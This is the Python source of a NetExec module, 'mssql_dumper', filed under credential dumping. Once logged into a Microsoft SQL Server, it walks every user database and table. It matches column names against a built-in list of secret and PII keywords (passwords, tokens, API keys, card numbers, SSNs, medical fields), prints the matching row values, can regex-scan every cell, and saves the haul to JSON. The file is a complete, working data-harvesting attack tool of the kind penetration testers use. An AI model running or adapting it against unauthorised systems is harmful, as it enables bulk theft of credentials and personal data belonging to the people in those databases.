import json
import datetime
import os
from pathlib import Path
import re
from nxc.helpers.misc import CATEGORY
from nxc.paths import NXC_PATH


class NXCModule:
    """MSSQL Dumper v1 - Created by LTJAX"""
    name = "mssql_dumper"
    description = "Search for Sensitive Data across all databases"
    supported_protocols = ["mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        SHOW_DATA    Display the actual row data values of the matched columns (default: True)
        REGEX        Semicolon-separated regex(es) to search for in **Cell Values**
        LIKE_SEARCH  Comma-separated list or filename of column names to specifically look for
        USE_PRESET   Use a predefined set of regex patterns for common PII (default: True)
        SAVE         Save the output to sqlite database (default: True)
        """
        self.regex_patterns = []
        self.show_data = module_options.get("SHOW_DATA", "true").lower() in ["true", "1", "yes"]
        regex_input = module_options.get("REGEX", "")
        for pattern in regex_input.split(";"):
            pattern = pattern.strip()
            if pattern:
                try:
                    self.regex_patterns.append(re.compile(pattern))
                except re.error as e:
                    context.log.fail(f"[!] Invalid regex pattern '{pattern}': {e}")
        like_input = module_options.get("LIKE_SEARCH", "")
        if os.path.isfile(like_input):
            with open(like_input) as f:
                self.like_search = [line.strip().lower() for line in f if line.strip()]
        else:
            self.like_search = [s.strip().lower() for s in like_input.split(",") if s.strip()]
        self.use_preset = module_options.get("USE_PRESET", "true").lower() in ["true", "1", "yes"]
        self.save = module_options.get("SAVE", "true").lower() in ["true", "1", "yes"]

    def pii(self):
        """Common personally identifiable information (PII) keywords to search for in column names"""
        return ["access_token", "account_number", "address", "allergies", "alt_email", "annual_salary", "apartment",
                "api_key", "auth_code", "auth_token", "bank_account", "bank_code", "bank_id", "bank_name", "bic",
                "billing_address", "birth_date", "blood_type", "card_exp", "card_number", "cardholder_name", "cc_exp_month",
                "cc_exp_year", "cc_number", "ccv", "city", "compensation", "contract_number", "country", "credit_card_expiry",
                "credit_card_hash", "credit_card_number", "credit_card", "creditcard", "cvv", "cvv2", "date_of_birth",
                "debit_card", "diagnosis", "dl_number", "dob", "drivers_license", "ein", "email_address", "email",
                "emergency_contact", "employee_id", "employment_status", "expiration_date", "expiry_date", "fax", "first_name",
                "full_name", "gender", "health_id", "house_number", "iban", "income", "insurance_id", "insurance_number",
                "invoice_id", "invoice_total", "job_title", "last_name", "legal_entity", "legal_name", "location", "login_token",
                "maiden_name", "medical_record", "medication", "mfa_secret", "middle_name", "mobile", "national_id", "nickname",
                "nin", "old_password", "order_amount", "order_id", "order_total", "otp_secret", "passport_number", "passwd_hash",
                "passwd", "password_hash", "password_plaintext", "password_salt", "password", "patient_id", "payment_status",
                "payment_token", "paypal_email", "phone_number", "phone", "phonenumber", "pin_code", "pin", "position",
                "prescriptions", "recovery_key", "refresh_token", "region", "reset_token", "routing_number", "salary", "secret_key",
                "security_answer", "security_code", "security_pin", "security_question", "session_token", "session", "sessionid",
                "social_security_number", "ssn_hash", "ssn", "state", "street", "tax_id", "temp_password", "tin", "token",
                "treatment", "user_credential", "user_name", "user_pass", "user_password", "user_secret", "user_token", "username",
                "zip", "zipcode"]

    def on_login(self, context, connection):
        all_results = []
        databases = connection.conn.sql_query("SELECT name FROM master.dbo.sysdatabases")
        if connection.conn.lastError:
            context.log.fail(f"Failed to retrieve databases: {connection.conn.lastError}")
            return

        for db in databases:
            db_name = db.get("name") or db.get("", "")
            if db_name.lower() in ("master", "model", "msdb", "tempdb"):
                continue  # skip system DBs

            context.log.display(f"Searching database: {db_name}")
            connection.conn.sql_query(f"USE [{db_name}]")

            # get all tables in this DB
            tables = connection.conn.sql_query("SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'")

            for table in tables:
                table_name = table.get("table_name", "")
                try:
                    columns = connection.conn.sql_query(f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}'")

                    # find matching columns
                    search_keys = []
                    if self.use_preset:
                        search_keys += self.pii()
                    if self.like_search:
                        search_keys += self.like_search
                    matched = [col for col in columns if any(key in col["column_name"].lower() for key in search_keys)]
                    if matched:
                        column_str = ", ".join(f"[{c['column_name']}]" for c in matched)
                        context.log.success(f"Match in {db_name}.{table_name} => Columns: {column_str}")
                        data = connection.conn.sql_query(f"SELECT {column_str} FROM [{table_name}]")
                        for row in data:
                            decoded_data = {k: (v.decode("utf-8", "replace").strip() if isinstance(v, bytes) else str(v).strip()) for k, v in row.items()}
                            if self.show_data:
                                context.log.highlight(f"{db_name}.{table_name} => " + ", ".join(f"{k}: {v}" for k, v in decoded_data.items()))
                            all_results.append({
                                "type": "column_match",
                                "database": db_name,
                                "table": table_name,
                                "row": {k: v.strip() for k, v in decoded_data.items()}
                            })

                except Exception as e:
                    context.log.fail(f"Failed to inspect table {table_name} in {db_name}: {e}")

                # If regex patterns are provided, scan all cell values in the table for matches
                if self.regex_patterns:
                    try:
                        full_data = connection.conn.sql_query(f"SELECT * FROM [{table_name}]")
                        for row in full_data:
                            matched_cells = {}
                            for col, val in row.items():
                                val_str = val.decode("utf-8", "replace").strip() if isinstance(val, bytes) else str(val).strip()

                                # Check if any of the cells in the row match any of the regex patterns
                                for pattern in self.regex_patterns:
                                    if pattern.search(val_str):
                                        matched_cells[col] = val_str
                                        break

                            if matched_cells:
                                match_str = ", ".join(f"{k}: {v}" for k, v in matched_cells.items())
                                if self.show_data:
                                    context.log.highlight(f"{db_name}.{table_name} => Regex Match => {match_str}")
                                all_results.append({
                                    "type": "regex_match",
                                    "database": db_name,
                                    "table": table_name,
                                    "matched_cells": matched_cells
                                })
                    except Exception as e:
                        context.log.fail(f"Regex scan failed for {db_name}.{table_name}: {e}")

        if self.save and all_results:
            filename = f"{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.json"
            file_path = Path(f"{NXC_PATH}/modules/mssql-dumper/{filename}").resolve()
            os.makedirs(file_path.parent, exist_ok=True)
            with open(file_path, "w") as f:
                json.dump(all_results, f, indent=2)
                context.log.success(f"Data saved to {file_path}")
